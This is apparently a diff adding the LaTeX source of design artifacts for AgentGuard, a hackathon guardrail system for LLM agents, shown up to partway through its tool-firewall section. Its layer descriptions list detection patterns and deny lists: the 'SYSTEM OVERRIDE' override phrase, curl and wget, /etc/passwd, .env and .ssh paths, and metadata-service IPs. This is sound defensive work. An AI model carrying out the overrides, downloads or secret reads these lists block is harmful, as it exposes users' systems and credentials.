@@ -1,0 +1,1749 @@
+\documentclass[11pt,a4paper]{article}
+
+% ─── Packages ───────────────────────────────────────────────────────────────
+\usepackage[margin=2cm]{geometry}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage{microtype}
+\usepackage{xcolor}
+\usepackage{tikz}
+\usetikzlibrary{
+  positioning, arrows.meta, shapes.geometric, shapes.misc,
+  fit, calc, backgrounds, decorations.pathreplacing,
+  patterns, shadows.blur, chains, matrix
+}
+\usepackage{tabularx}
+\usepackage{booktabs}
+\usepackage{array}
+\usepackage{longtable}
+\usepackage{enumitem}
+\usepackage{fancyhdr}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{float}
+\usepackage{caption}
+\usepackage{tcolorbox}
+\tcbuselibrary{skins,breakable}
+\usepackage{fontawesome5}
+\usepackage{pifont}
+\usepackage{pgfplots}
+\pgfplotsset{compat=1.18}
+
+% ─── Color Definitions ─────────────────────────────────────────────────────
+\definecolor{darknavy}{HTML}{0D1B2A}
+\definecolor{deepblue}{HTML}{1B2838}
+\definecolor{accentorange}{HTML}{E8611A}
+\definecolor{accentcyan}{HTML}{00BCD4}
+\definecolor{layerL1}{HTML}{E74C3C}
+\definecolor{layerL2}{HTML}{F39C12}
+\definecolor{layerL3}{HTML}{2196F3}
+\definecolor{layerL4}{HTML}{4CAF50}
+\definecolor{blockred}{HTML}{C0392B}
+\definecolor{passgreen}{HTML}{27AE60}
+\definecolor{warnambr}{HTML}{F1C40F}
+\definecolor{lightgray}{HTML}{F5F6FA}
+\definecolor{medgray}{HTML}{BDC3C7}
+\definecolor{codebg}{HTML}{1E1E2E}
+\definecolor{codecomment}{HTML}{6A9955}
+\definecolor{codestring}{HTML}{CE9178}
+\definecolor{codekeyword}{HTML}{569CD6}
+\definecolor{sectionbg}{HTML}{EBF5FB}
+
+% ─── Hyperref Setup ─────────────────────────────────────────────────────────
+\hypersetup{
+  colorlinks=true,
+  linkcolor=deepblue,
+  urlcolor=accentcyan,
+  citecolor=accentorange,
+  pdfauthor={Team NamoFans},
+  pdftitle={AgentGuard --- Supporting Artifacts},
+  pdfsubject={Architecture and Design},
+}
+
+% \secmark / \layertag use TikZ nodes — hyperref cannot PDF-encode TikZ.
+% Strip them in bookmark strings; \; becomes a space.
+\pdfstringdefDisableCommands{%
+  \def\secmark#1{#1.\space}%
+  \def\layertag#1#2{[#2]\space}%
+  \let\;\space
+  \let\faUser\relax
+  \let\faCheckCircle\relax
+  \let\faCog\relax
+  \let\faChartLine\relax
+}
+
+% ─── Header/Footer ─────────────────────────────────────────────────────────
+\setlength{\headheight}{13.6pt}
+\addtolength{\topmargin}{-1.6pt}
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\small\textbf{AgentGuard --- Supporting Artifacts}}
+\fancyhead[R]{\small\textcolor{accentcyan}{AI Unlocked 2026 $\cdot$ Track 5: Trustworthy AI $\cdot$ IIT Kharagpur}}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0pt}
+
+% ─── Code Listing Style ────────────────────────────────────────────────────
+\lstdefinestyle{pythonstyle}{
+  backgroundcolor=\color{codebg},
+  basicstyle=\ttfamily\small\color{white},
+  keywordstyle=\color{codekeyword}\bfseries,
+  stringstyle=\color{codestring},
+  commentstyle=\color{codecomment}\itshape,
+  language=Python,
+  showstringspaces=false,
+  breaklines=true,
+  frame=single,
+  rulecolor=\color{medgray},
+  xleftmargin=4pt,
+  xrightmargin=4pt,
+  aboveskip=8pt,
+  belowskip=8pt,
+}
+
+% ─── Custom tcolorbox styles ───────────────────────────────────────────────
+\newtcolorbox{sectionbox}[2][]{%
+  enhanced, breakable,
+  colback=sectionbg, colframe=accentcyan,
+  fonttitle=\bfseries\large,
+  title={#2},
+  attach boxed title to top left={yshift=-2mm,xshift=4mm},
+  boxed title style={colback=accentorange, colframe=accentorange, sharp corners},
+  sharp corners=south,
+  top=4mm,
+  #1
+}
+
+\newtcolorbox{layerbox}[2][]{%
+  enhanced,
+  colback=white, colframe=#2,
+  boxrule=1.5pt,
+  left=4pt, right=4pt, top=3pt, bottom=3pt,
+  sharp corners,
+  #1
+}
+
+% ─── Custom Commands ───────────────────────────────────────────────────────
+\DeclareRobustCommand{\layertag}[2]{%
+  \tikz[baseline=(tag.base)]{
+    \node[fill=#1, text=white, font=\sffamily\bfseries\scriptsize,
+          rounded corners=2pt, inner sep=2pt, minimum width=1.8em] (tag) {#2};
+  }%
+}
+
+\DeclareRobustCommand{\secmark}[1]{%
+  \tikz[baseline=(num.base)]{
+    \node[circle, fill=accentorange, text=white, font=\sffamily\bfseries,
+          inner sep=0pt, minimum size=1.6em] (num) {#1};
+  }%
+}
+
+% ─── Document ──────────────────────────────────────────────────────────────
+\begin{document}
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  TITLE PAGE
+% ═══════════════════════════════════════════════════════════════════════════
+\thispagestyle{empty}
+\begin{tikzpicture}[remember picture, overlay]
+  % Background
+  \fill[darknavy] (current page.south west) rectangle (current page.north east);
+
+  % Grid pattern
+  \foreach \x in {-10,-9.5,...,12} {
+    \draw[deepblue!40, very thin] (\x,-16) -- (\x,16);
+  }
+  \foreach \y in {-16,-15.5,...,16} {
+    \draw[deepblue!40, very thin] (-10,\y) -- (12,\y);
+  }
+
+  % Orange accent bar at top
+  \fill[accentorange] ([yshift=-4mm]current page.north west) rectangle
+    ([yshift=-8mm]current page.north east);
+
+  % Shield icon
+  \begin{scope}[shift={(current page.center)}, yshift=2cm]
+    \draw[accentcyan, line width=2pt]
+      (0,2.2) -- (1.6,1.4) -- (1.6,-0.6)
+      .. controls (1.6,-1.8) and (0,-2.6) .. (0,-2.8)
+      .. controls (0,-2.6) and (-1.6,-1.8) .. (-1.6,-0.6)
+      -- (-1.6,1.4) -- cycle;
+    \draw[accentcyan, line width=2.5pt]
+      (-0.6,0) -- (-0.1,-0.5) -- (0.7,0.6);
+  \end{scope}
+
+  % Title text
+  \node[anchor=center, font=\sffamily\bfseries\Huge, text=white]
+    at ([yshift=-2cm]current page.center) {AgentGuard};
+  \node[anchor=center, font=\sffamily\large, text=accentcyan]
+    at ([yshift=-3.2cm]current page.center)
+    {Supporting Artifacts --- Architecture \& Design};
+
+  % Orange rule
+  \draw[accentorange, line width=2pt]
+    ([yshift=-3.8cm, xshift=-3cm]current page.center) --
+    ([yshift=-3.8cm, xshift=3cm]current page.center);
+
+  % Event info
+  \node[anchor=center, font=\sffamily, text=medgray]
+    at ([yshift=-4.8cm]current page.center)
+    {AI Unlocked 2026\enspace$\cdot$\enspace
+     Track 5: Trustworthy AI\enspace$\cdot$\enspace IIT Kharagpur};
+  \node[anchor=center, font=\sffamily, text=medgray]
+    at ([yshift=-5.5cm]current page.center) {Team NamoFans};
+
+  % Team members bar
+  \fill[deepblue!80, rounded corners=6pt]
+    ([yshift=3cm, xshift=1.5cm]current page.south west) rectangle
+    ([yshift=5cm, xshift=-1.5cm]current page.south east);
+
+  \node[anchor=center, font=\sffamily\bfseries\small, text=white]
+    at ([yshift=4.3cm, xshift=-5.5cm]current page.south) {Animesh Raj};
+  \node[anchor=center, font=\sffamily\tiny, text=accentcyan]
+    at ([yshift=3.6cm, xshift=-5.5cm]current page.south) {Research \& Docs};
+
+  \node[anchor=center, font=\sffamily\bfseries\small, text=white]
+    at ([yshift=4.3cm, xshift=-2.5cm]current page.south) {Atul Singh};
+  \node[anchor=center, font=\sffamily\tiny, text=accentcyan]
+    at ([yshift=3.6cm, xshift=-2.5cm]current page.south) {AI/ML Arch};
+
+  \node[anchor=center, font=\sffamily\bfseries\small, text=white]
+    at ([yshift=4.3cm, xshift=0.5cm]current page.south) {Devansh Gupta};
+  \node[anchor=center, font=\sffamily\tiny, text=accentcyan]
+    at ([yshift=3.6cm, xshift=0.5cm]current page.south) {Backend \& Cloud};
+
+  \node[anchor=center, font=\sffamily\bfseries\small, text=white]
+    at ([yshift=4.3cm, xshift=3.5cm]current page.south) {Prem Agarwal};
+  \node[anchor=center, font=\sffamily\tiny, text=accentcyan]
+    at ([yshift=3.6cm, xshift=3.5cm]current page.south) {Security \& Safety};
+
+  \node[anchor=center, font=\sffamily\bfseries\small, text=white]
+    at ([yshift=4.3cm, xshift=6.8cm]current page.south) {Mohd Faizan Khan};
+  \node[anchor=center, font=\sffamily\tiny, text=accentcyan]
+    at ([yshift=3.6cm, xshift=6.8cm]current page.south) {Backend \& Cloud};
+\end{tikzpicture}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  TABLE OF CONTENTS
+% ═══════════════════════════════════════════════════════════════════════════
+\begin{sectionbox}{Contents\hfill\small What's inside this document}
+
+\begin{center}
+\renewcommand{\arraystretch}{1.35}
+\begin{tabularx}{\linewidth}{%
+  >{\centering\bfseries\color{accentorange}}c
+  X
+  >{\centering\arraybackslash}c}
+\toprule
+\textbf{\#} & \textbf{Section} & \textbf{Page} \\
+\midrule
+1  & System Architecture Diagram                          & \pageref{sec:arch} \\
+2  & Guardian 4-Layer Defense-in-Depth Flow                & \pageref{sec:layers} \\
+3  & End-to-End Request Lifecycle Flowchart                 & \pageref{sec:lifecycle} \\
+4  & Tool Firewall Decision Tree                            & \pageref{sec:firewall} \\
+5  & Developer Integration Flow (4-Step Onboarding)         & \pageref{sec:integration} \\
+6  & Dashboard Wireframes                                   & \pageref{sec:dashboard} \\
+7  & Threat Model --- Attack Surface Map                    & \pageref{sec:threat} \\
+8  & Technology Stack \& Component Map                      & \pageref{sec:techstack} \\
+9  & Benchmark \& Metrics Summary                           & \pageref{sec:benchmark} \\
+10 & Design Decisions Matrix                                & \pageref{sec:decisions} \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\end{sectionbox}
+
+\vspace{1cm}
+
+\noindent\textit{All diagrams are rendered as production-quality TikZ figures.
+The surrounding specification tables contain the complete detail needed to
+reconstruct or validate each diagram.}
+
+\bigskip
+\noindent\textbf{Live prototype:}
+\url{https://agentguard.exempl4r.xyz/}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  SECTION 1 — System Architecture Diagram
+% ═══════════════════════════════════════════════════════════════════════════
+\section{\secmark{1} System Architecture Diagram}
+\label{sec:arch}
+\vspace{-2mm}
+{\small\itshape High-level component layout and data-flow overview}
+
+\vspace{6mm}
+
+\begin{figure}[H]
+\centering
+\resizebox{\textwidth}{!}{%
+\begin{tikzpicture}[
+  every node/.style={font=\sffamily\small},
+  mybox/.style={draw, rounded corners=4pt, minimum height=1.4cm,
+              text width=#1, align=center, fill=white, line width=0.8pt},
+  mybox/.default=3.5cm,
+  bigzone/.style={draw, rounded corners=6pt, line width=1.2pt,
+                 inner sep=8pt, fill=#1!5},
+  bigzone/.default=accentcyan,
+  myarrow/.style={-{Stealth[length=6pt]}, thick, color=#1},
+  myarrow/.default=darknavy,
+  lbl/.style={font=\sffamily\scriptsize, text=darknavy},
+]
+
+% === Outer system boundary ===
+\node[draw=accentcyan, line width=2pt, rounded corners=10pt,
+      fill=darknavy!3, minimum width=17cm, minimum height=14.5cm,
+      label={[font=\sffamily\bfseries\large, text=darknavy]
+             above:{\MakeUppercase{AgentGuard System}}}]
+  (sys) at (0,0) {};
+
+% === Decorator Layer ===
+\node[bigzone=accentorange, minimum width=15.5cm, minimum height=2.2cm,
+      draw=accentorange]
+  (decor) at (0,5.4) {};
+\node[font=\sffamily\bfseries, text=accentorange, anchor=north west]
+  at ([xshift=6pt, yshift=-4pt]decor.north west)
+  {Decorator Layer\enspace\scriptsize(agentguard/decorators.py)};
+
+\node[mybox=3cm, fill=accentorange!10, draw=accentorange!60]
+  (ga) at (-4.5,5.1) {\texttt{@guard\_agent}\\[-1pt]
+  {\tiny Wraps full agent}\\[-1pt]{\tiny (L1+L2+L4)}};
+\node[mybox=3cm, fill=accentorange!10, draw=accentorange!60]
+  (gf) at (-0.5,5.1) {\texttt{@guard}\\[-1pt]
+  {\tiny Per-function}\\[-1pt]{\tiny (L3+L4)}};
+\node[mybox=3cm, fill=accentorange!10, draw=accentorange!60]
+  (gi) at (3.5,5.1) {\texttt{@guard\_input}\\[-1pt]
+  {\tiny Input-only gate}};
+
+% === Guardian Orchestrator ===
+\node[bigzone=accentcyan, minimum width=15.5cm, minimum height=1.8cm,
+      draw=accentcyan]
+  (orch) at (0,2.8) {};
+\node[font=\sffamily\bfseries, text=accentcyan, anchor=north west]
+  at ([xshift=6pt, yshift=-4pt]orch.north west)
+  {Guardian Orchestrator\enspace\scriptsize(agentguard/guardian.py)};
+
+\node[font=\ttfamily\small, text=darknavy] at (0,2.5)
+  {validate\_input() \;$\rightarrow$\;
+   validate\_tool\_call() \;$\rightarrow$\;
+   validate\_output()};
+
+% Arrow from Decorator to Orchestrator
+\draw[myarrow=accentorange, line width=1.5pt]
+  (decor.south) -- node[right, lbl] {intercepts every call} (orch.north);
+
+% === Four engine boxes ===
+% L1 Input Shield
+\node[mybox=3.2cm, fill=layerL1!10, draw=layerL1, minimum height=3.2cm]
+  (l1) at (-5.5,-0.2) {%
+    \layertag{layerL1}{L1}\\[3pt]
+    \textbf{Input Shield}\\[5pt]
+    {\tiny\texttt{fast\_inject}}\\[-1pt]
+    {\tiny (33 regex)}\\[2pt]
+    {\tiny\texttt{prompt\_shields}}\\[-1pt]
+    {\tiny blocklists}
+  };
+
+% L4 RBAC + Behavioral
+\node[mybox=3.2cm, fill=layerL4!10, draw=layerL4, minimum height=3.2cm]
+  (l4) at (-1.8,-0.2) {%
+    \layertag{layerL4}{L4}\\[3pt]
+    \textbf{RBAC + Behav.}\\[5pt]
+    {\tiny L4RBACEngine}\\[-1pt]
+    {\tiny (ABAC)}\\[2pt]
+    {\tiny Behavioral}\\[-1pt]
+    {\tiny Anomaly (5 sig.)}
+  };
+
+% L3 Tool Firewall
+\node[mybox=3.2cm, fill=layerL3!10, draw=layerL3, minimum height=3.2cm]
+  (l3) at (1.9,-0.2) {%
+    \layertag{layerL3}{L3}\\[3pt]
+    \textbf{Tool Firewall}\\[5pt]
+    {\tiny 5 guardrails}\\[-1pt]
+    {\tiny C1 entity}\\[-1pt]
+    {\tiny C2 MELON}\\[-1pt]
+    {\tiny C4 HITL/AITL}
+  };
+
+% Observability
+\node[mybox=3.2cm, fill=deepblue!8, draw=deepblue, minimum height=3.2cm]
+  (obs) at (5.5,-0.2) {%
+    \faEye\\[3pt]
+    \textbf{Observability}\\[5pt]
+    {\tiny OTel $\to$ Jaeger}\\[-1pt]
+    {\tiny :4317}\\[2pt]
+    {\tiny SQLite}\\[-1pt]
+    {\tiny audit.db}
+  };
+
+% Arrow from orchestrator to engines
+\draw[myarrow=accentcyan] ([xshift=-4cm]orch.south) -- (l1.north);
+\draw[myarrow=accentcyan] ([xshift=-1.3cm]orch.south) -- (l4.north);
+\draw[myarrow=accentcyan] ([xshift=1.3cm]orch.south) -- (l3.north);
+\draw[myarrow=accentcyan] ([xshift=4cm]orch.south) -- (obs.north);
+
+% === L2 Output Guard ===
+\node[mybox=4.2cm, fill=layerL2!10, draw=layerL2, minimum height=2.8cm]
+  (l2) at (-4,-4) {%
+    \layertag{layerL2}{L2}\\[3pt]
+    \textbf{Output Guard}\\[5pt]
+    {\tiny Azure AI Language}\\[-1pt]
+    {\tiny (PII redaction)}\\[2pt]
+    {\tiny Azure Content Safety}\\[-1pt]
+    {\tiny (toxicity)}\\[2pt]
+    {\tiny Groundedness LLM}
+  };
+
+% === Config Engine ===
+\node[mybox=5.8cm, fill=warnambr!10, draw=warnambr, minimum height=2.8cm]
+  (cfg) at (3.5,-4) {%
+    \faCog\\[3pt]
+    \textbf{Config Engine}\\[5pt]
+    {\small\texttt{agentguard.yaml}}\\[-1pt]
+    {\tiny $\leftarrow$ \texttt{agentguard init}}\\[3pt]
+    {\tiny Modes: \textbf{enforce} $|$ \textbf{monitor} $|$ \textbf{dry-run}}
+  };
+
+\end{tikzpicture}
+}%
+\caption{AgentGuard full system architecture.}
+\label{fig:architecture}
+\end{figure}
+
+\vspace{4mm}
+
+\renewcommand{\arraystretch}{1.25}
+\noindent
+\begin{tabularx}{\textwidth}{%
+  >{\bfseries\small\color{accentorange}}l
+  >{\small}l
+  >{\small}X}
+\toprule
+\textbf{Component} & \textbf{Technology} & \textbf{Role} \\
+\midrule
+Decorator Layer & \texttt{@guard\_agent} / \texttt{@guard} / \texttt{@guard\_input} &
+  Zero-change agent wrapping; intercepts calls before and after LLM execution \\
+Guardian Orch. & Pure Python in-process &
+  Routes every call through L1$\to$L4 in sequence; emits security events \\
+Config Engine & \texttt{agentguard.yaml} + CLI &
+  YAML-driven policy; generated per-project via CLI scaffold \\
+L1 Input Shield & Tier-0 blocklist $\cdot$ Tier-1 regex (33) $\cdot$ Azure Prompt Shields &
+  Blocks injection before any API call; $\sim$40--60\,\% free-tier block rate \\
+L2 Output Guard & Azure AI Language (PII) + Content Safety + LLM groundedness &
+  SSN, keys, emails redacted; blocks toxic outputs; detects hallucinations \\
+L3 Tool Firewall & Pure Python; 5 guardrails + C1/C2/C4 &
+  Validates tool-call arguments before execution; HITL escalation \\
+L4 RBAC + Behav. & \texttt{L4RBACEngine} + \texttt{BehavioralAnomalyDetector} &
+  Composite score: Z-score, Levenshtein, read$\to$exfil, domain, entropy \\
+Observability & OpenTelemetry $\to$ Jaeger + SQLite &
+  Live SRE traces + tamper-evident compliance record \\
+Dashboard & FastAPI $\cdot$ \url{https://agentguard.exempl4r.xyz/} &
+  Real-time OTel stream, layer breakdown, guarded vs unguarded toggle \\
+\bottomrule
+\end{tabularx}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  SECTION 2 — Guardian 4-Layer Defense-in-Depth Flow
+% ═══════════════════════════════════════════════════════════════════════════
+\section{\secmark{2}\; Guardian 4-Layer Defense-in-Depth Flow}
+\label{sec:layers}
+\vspace{-2mm}
+{\small\itshape Sequential security pipeline with block conditions per layer}
+
+\vspace{6mm}
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+  every node/.style={font=\sffamily\small},
+  layernd/.style={
+    draw=#1, line width=1.5pt, rounded corners=6pt,
+    fill=#1!6, minimum width=14cm, align=left,
+    inner sep=10pt, text width=13cm
+  },
+  arrowdn/.style={-{Stealth[length=7pt]}, line width=1.5pt, color=accentcyan},
+]
+
+% Entry
+\node[draw=darknavy, rounded corners=4pt, fill=darknavy!8,
+      minimum width=8cm, align=center, inner sep=6pt]
+  (entry) at (0,0) {\faUser\enspace User / Orchestrator sends input};
+
+\draw[arrowdn] (entry.south) -- ++(0,-0.7);
+
+% L1
+\node[layernd=layerL1, below=1cm of entry]
+  (l1box) {%
+    \layertag{layerL1}{L1}\;\textbf{INPUT SHIELD}\\[6pt]
+    \begin{minipage}{12.5cm}
+    \begin{itemize}[leftmargin=1.2em, itemsep=2pt, parsep=0pt, topsep=0pt]
+      \item Tier\,0:\;Exact blocklist match \hfill $<0.1$\,ms\enspace FREE
+      \item Tier\,1:\;33-pattern regex (\texttt{SYSTEM OVERRIDE}, \texttt{curl},
+            \texttt{/etc/passwd}\,\ldots) \hfill $<1$\,ms\enspace FREE
+            $\;\to$ \textcolor{blockred}{\textbf{BLOCK}}
+      \item Tier\,2:\;Azure AI Prompt Shields --- jailbreak + indirect injection
+            \hfill $\sim$50\,ms $\;\to$ \textcolor{blockred}{\textbf{BLOCK}}
+    \end{itemize}
+    \end{minipage}
+  };
+
+\draw[arrowdn] (l1box.south) -- ++(0,-0.6)
+  node[right, font=\sffamily\tiny, text=passgreen, xshift=3pt] {clean inputs only};
+
+% Agent LLM
+\node[draw=medgray, rounded corners=4pt, fill=medgray!15,
+      minimum width=10cm, align=center, inner sep=5pt, below=0.9cm of l1box]
+  (llm) {Agent LLM runs --- generates response + optional tool calls};
+
+\draw[arrowdn] (llm.south) -- ++(0,-0.6);
+
+% L4
+\node[layernd=layerL4, below=0.9cm of llm]
+  (l4box) {%
+    \layertag{layerL4}{L4}\;\textbf{RBAC + BEHAVIORAL}%
+    \enspace{\scriptsize(in-process, zero API cost)}\\[6pt]
+    \begin{minipage}{12.5cm}
+    \begin{itemize}[leftmargin=1.2em, itemsep=2pt, parsep=0pt, topsep=0pt]
+      \item ABAC: role $\times$ verb $\times$ resource\_sensitivity $\times$ risk\_score
+      \item Outcome: \textcolor{passgreen}{ALLOW} $|$
+            \textcolor{blockred}{DENY $\to$ BLOCK} $|$
+            \textcolor{warnambr}{ELEVATE $\to$ HITL queue}
+      \item Behavioral signals:
+            \ding{192}\,Z-score ($2.5\sigma$)\;
+            \ding{193}\,Levenshtein ($0.4$)\;
+            \ding{194}\,read$\to$exfil\;
+            \ding{195}\,domain\;
+            \ding{196}\,entropy ($1.5\times$)
+    \end{itemize}
+    \end{minipage}
+  };
+
+\draw[arrowdn] (l4box.south) -- ++(0,-0.6);
+
+% L3
+\node[layernd=layerL3, below=0.9cm of l4box]
+  (l3box) {%
+    \layertag{layerL3}{L3}\;\textbf{TOOL FIREWALL}\\[6pt]
+    \begin{minipage}{12.5cm}
+    \begin{itemize}[leftmargin=1.2em, itemsep=2pt, parsep=0pt, topsep=0pt]
+      \item \texttt{file\_system}: path allowlist; blocks
+            \texttt{.env .pem .key .ssh /etc/}
+      \item \texttt{sql\_query}: SELECT only --- blocks DROP/DELETE/UPDATE/INSERT
+      \item \texttt{shell\_cmds}: denylist
+            \texttt{rm curl wget bash sh sudo eval exec}
+      \item \texttt{http\_get/post}: HTTPS only; blocks 169.254.x.x IMDS + RFC-1918
+      \item C1 Azure entity recog $\cdot$ C2 MELON (opt-in) $\cdot$ C4 HITL/AITL
+    \end{itemize}
+    \end{minipage}
+  };
+
+\draw[arrowdn] (l3box.south) -- ++(0,-0.6)
+  node[right, font=\sffamily\tiny, text=passgreen, xshift=3pt]
+  {tool executes only if all pass};
+
+% Tool result
+\node[draw=medgray, rounded corners=4pt, fill=medgray!15,
+      minimum width=10cm, align=center, inner sep=5pt, below=0.9cm of l3box]
+  (toolret) {Tool returns result $\to$ Agent generates final response};
+
+\draw[arrowdn] (toolret.south) -- ++(0,-0.6);
+
+% L2
+\node[layernd=layerL2, below=0.9cm of toolret]
+  (l2box) {%
+    \layertag{layerL2}{L2}\;\textbf{OUTPUT GUARDRAIL}\\[6pt]
+    \begin{minipage}{12.5cm}
+    \begin{itemize}[leftmargin=1.2em, itemsep=2pt, parsep=0pt, topsep=0pt]
+      \item Azure AI Language $\to$ PII redaction (SSN, API keys, email)
+      \item Azure Content Safety $\to$ Toxicity classification + filter
+      \item LLM-as-judge Groundedness $\to$ score 1--5; threshold 3
+    \end{itemize}
+    \end{minipage}
+  };
+
+\draw[arrowdn] (l2box.south) -- ++(0,-0.6);
+
+% Safe response
+\node[draw=passgreen, line width=2pt, rounded corners=4pt,
+      fill=passgreen!12, minimum width=8cm, align=center, inner sep=6pt,
+      below=0.9cm of l2box]
+  (safe) {\faCheckCircle\enspace\textbf{SAFE RESPONSE} $\to$ User};
+
+% OTel note
+\node[font=\sffamily\tiny, text=medgray, below=0.4cm of safe, align=center]
+  {All events written to OTel + SQLite in parallel via
+   \texttt{\_notify\_security\_event()}};
+
+\end{tikzpicture}
+\caption{Guardian 4-layer defense-in-depth pipeline.}
+\label{fig:layers}
+\end{figure}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  SECTION 3 — End-to-End Request Lifecycle Flowchart
+% ═══════════════════════════════════════════════════════════════════════════
+\section{\secmark{3}\; End-to-End Request Lifecycle Flowchart}
+\label{sec:lifecycle}
+\vspace{-2mm}
+{\small\itshape From raw user input to safe response --- every decision node}
+
+\vspace{6mm}
+
+\begin{figure}[H]
+\centering
+\resizebox{0.95\textwidth}{!}{%
+\begin{tikzpicture}[
+  every node/.style={font=\sffamily\small},
+  stepnd/.style={draw=accentcyan, rounded corners=5pt, fill=accentcyan!6,
+               minimum width=12cm, align=center, inner sep=7pt, line width=1pt},
+  decisionnd/.style={draw=#1, diamond, aspect=2.5, inner sep=3pt,
+                   fill=#1!10, font=\sffamily\scriptsize,
+                   align=center, line width=0.8pt},
+  blocknd/.style={draw=blockred, rounded corners=3pt, fill=blockred!15,
+                font=\sffamily\scriptsize\bfseries, text=blockred,
+                align=center, inner sep=4pt},
+  myarr/.style={-{Stealth[length=5pt]}, thick, darknavy},
+]
+
+% Step 1 — User
+\node[stepnd] (s1) at (0,0)
+  {\textbf{Step 1}\enspace\faUser\enspace
+   User / Orchestrator --- Raw prompt string};
+
+% Step 2 — L1 Tier 0/1
+\node[decisionnd=layerL1, below=1cm of s1] (d1) {Tier 0/1\\regex?};
+\node[blocknd, right=3cm of d1] (b1)
+  {\texttt{InputBlockedError}\;($<1$\,ms)};
+
+% Step 3 — L1 Tier 2
+\node[decisionnd=layerL1, below=1.4cm of d1] (d2) {Tier 2\\Azure?};
+\node[blocknd, right=3cm of d2] (b2)
+  {\texttt{InputBlockedError}\;($\sim$50\,ms)};
+
+% Step 4 — Agent
+\node[stepnd, below=1.4cm of d2] (s4)
+  {\textbf{Step 2}\enspace Agent function executes ---
+   LLM generates response + tool\_calls[]};
+
+% Step 5 — L4
+\node[decisionnd=layerL4, below=1.2cm of s4] (d4) {L4 RBAC\\ALLOW?};
+\node[blocknd, right=3cm of d4] (b4) {\texttt{ToolCallBlockedError}};
+\node[draw=warnambr, rounded corners=3pt, fill=warnambr!15,
+      font=\sffamily\scriptsize, text=warnambr!80!black,
+      inner sep=4pt, left=3cm of d4] (hitl) {ELEVATE $\to$ HITL};
+
+% Step 6 — L3
+\node[decisionnd=layerL3, below=1.4cm of d4] (d6) {L3 FW\\pass?};
+\node[blocknd, right=3cm of d6] (b6) {\texttt{ToolCallBlockedError}};
+
+% Step 7 — Tool executes
+\node[stepnd, below=1.2cm of d6] (s7)
+  {\textbf{Step 4}\enspace Tool executes ---
+   result returned to agent};
+
+% Step 8 — L2
+\node[decisionnd=layerL2, below=1.2cm of s7] (d8) {L2 Output\\safe?};
+\node[blocknd, right=3cm of d8] (b8) {\texttt{OutputBlockedError}};
+
+% Step 9 — Safe
+\node[draw=passgreen, line width=2pt, rounded corners=5pt,
+      fill=passgreen!12, minimum width=10cm, align=center,
+      inner sep=7pt, below=1.2cm of d8]
+  (s9) {\textbf{Step 6}\enspace\faCheckCircle\enspace
+        Safe response delivered --- OTel + SQLite};
+
+% Arrows
+\draw[myarr] (s1) -- (d1);
+\draw[myarr] (d1) -- node[above, font=\sffamily\tiny] {YES} (b1);
+\draw[myarr] (d1) -- node[left, font=\sffamily\tiny] {NO} (d2);
+\draw[myarr] (d2) -- node[above, font=\sffamily\tiny] {YES} (b2);
+\draw[myarr] (d2) -- node[left, font=\sffamily\tiny] {PASS} (s4);
+\draw[myarr] (s4) -- (d4);
+\draw[myarr] (d4) -- node[above, font=\sffamily\tiny] {DENY} (b4);
+\draw[myarr] (d4) -- node[above, font=\sffamily\tiny] {ELEV.} (hitl);
+\draw[myarr] (d4) -- node[left, font=\sffamily\tiny] {ALLOW} (d6);
+\draw[myarr] (d6) -- node[above, font=\sffamily\tiny] {BLOCK} (b6);
+\draw[myarr] (d6) -- node[left, font=\sffamily\tiny] {PASS} (s7);
+\draw[myarr] (s7) -- (d8);
+\draw[myarr] (d8) -- node[above, font=\sffamily\tiny] {BLOCK} (b8);
+\draw[myarr] (d8) -- node[left, font=\sffamily\tiny] {PASS} (s9);
+
+\end{tikzpicture}
+}%
+\caption{End-to-end request lifecycle with all decision branches.}
+\label{fig:lifecycle}
+\end{figure}
+
+\vspace{4mm}
+
+\renewcommand{\arraystretch}{1.2}
+\noindent
+{\small
+\begin{tabularx}{\textwidth}{c l l X}
+\toprule
+\textbf{Step} & \textbf{Actor} & \textbf{Input} & \textbf{Output / Decision} \\
+\midrule
+1  & User / Orchestrator & Raw prompt string
+   & Passed to \texttt{Guardian.validate\_input()} \\
+2  & L1 --- Tier 0/1 & Prompt string
+   & Exact match or regex $\to$ BLOCK (no API cost) \\
+3  & L1 --- Tier 2 & Prompt (ambiguous)
+   & Azure Prompt Shields $\to$ ALLOW or BLOCK \\
+4  & Agent function & Clean input
+   & LLM generates response + optional tool calls \\
+5  & L4 RBAC & Tool + args + role
+   & ALLOW / DENY / ELEVATE \\
+5a & HITL queue & (on ELEVATE)
+   & Human approves $\to$ resume; rejects $\to$ DENY \\
+6  & L3 Tool Firewall & Tool + validated args
+   & Arg-level check; ALLOW or BLOCK \\
+6a & C1 Entity recog & Tool arguments
+   & PII-in-args detection $\to$ flag or BLOCK \\
+6b & C2 MELON (opt-in) & Tool call + context
+   & Contrastive LLM cross-check $\to$ flag \\
+7  & Tool & Approved call
+   & Executes; result returned to agent \\
+8  & L2 Output & Response text
+   & PII redaction + toxicity filter $\to$ safe text \\
+9  & User & Safe response
+   & Delivered; full trace to OTel + SQLite \\
+\bottomrule
+\end{tabularx}
+}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  SECTION 4 — Tool Firewall Decision Tree
+% ═══════════════════════════════════════════════════════════════════════════
+\section{\secmark{4}\; Tool Firewall Decision Tree}
+\label{sec:firewall}
+\vspace{-2mm}
+{\small\itshape L3 argument-level validation logic for each tool class}
+
+\vspace{6mm}
+
+\begin{figure}[H]
+\centering
+\resizebox{\textwidth}{!}{%
+\begin{tikzpicture}[
+  every node/.style={font=\sffamily\small},
+  classify/.style={draw=layerL3, rounded corners=4pt, fill=layerL3!8,
+                   minimum width=3.5cm, align=center, inner sep=6pt,
+                   line width=1pt},
+  guard/.style={draw=layerL3!70, rounded corners=3pt, fill=white,
+                minimum width=2.6cm, minimum height=2cm,
+                align=center, inner sep=4pt, line width=0.7pt},
